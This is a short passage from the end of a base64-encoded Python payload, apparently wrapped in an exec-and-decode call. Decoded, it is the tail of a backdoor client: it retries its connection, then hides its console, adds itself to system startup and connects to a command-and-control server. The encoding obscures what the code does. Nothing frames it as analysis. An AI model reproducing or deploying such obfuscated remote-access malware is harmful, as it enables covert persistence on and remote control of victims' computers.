WFuZCBlcnJvcjoge3N0cihlKX0iKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBzYXZlX2xvZyhmIlstXSBDb25uZWN0aW9uIGVycm9yOiB7c3RyKGUpfSIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMzApCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgaGlkZV9jb25zb2xlKCkKICAgIGFkZF90b19zdGFydHVwKCkKICAgIGNvbm5lY3RfdG9fYzIoKQo=').decode())